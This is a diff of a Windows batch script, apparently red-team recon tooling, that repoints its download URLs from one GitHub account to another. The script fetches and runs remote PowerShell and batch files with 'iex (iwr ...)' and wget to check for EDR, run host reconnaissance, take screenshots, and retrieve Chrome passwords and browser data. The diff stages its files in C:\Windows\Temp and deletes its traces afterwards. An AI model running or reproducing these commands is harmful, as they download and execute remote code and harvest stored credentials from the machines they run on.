@@ -1,10 +1,10 @@
 echo FULL RECON STARTED
 echo CHECK EDR PRESENCE
-powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Check_EDR_Presence.ps1);Invoke-EDRCheck" >> C:\Windows\Temp\Check_EDR_Presence.txt
+powershell.exe "iex (iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Check_EDR_Presence.ps1);Invoke-EDRCheck" >> C:\Windows\Temp\Check_EDR_Presence.txt
 echo CHECK EDR PRESENCE COMPLETED
 
 echo STARTING HOST RECON
-powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_Complete.bat -o C:\Windows\Temp\Host_Recon_Complete.bat;C:\Windows\Temp\Host_Recon_Complete.bat;del C:\Windows\Temp\Host_Recon_Complete.bat"
+powershell.exe "wget https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Host_Recon_Complete.bat -o C:\Windows\Temp\Host_Recon_Complete.bat;C:\Windows\Temp\Host_Recon_Complete.bat;del C:\Windows\Temp\Host_Recon_Complete.bat"
 echo HOST RECON COMPLETED at C:\Windows\Temp\Host_Recon_Complete.txt
 
 echo RETRIEVING CHROME PASSWORDS
@@ -21,7 +21,7 @@ echo BROWSER DATA RETRIEVED
 
 REM ####EXTRA####
 REM echo SCREENSHOT
-REM powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot -Full -Path C:\Windows\Temp\ScreenShot.jpg"
+REM powershell.exe "iex (iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot -Full -Path C:\Windows\Temp\ScreenShot.jpg"
 REM echo SCREENSHOT TAKEN
 
 REM echo GET OUTLOOK PASSWORD
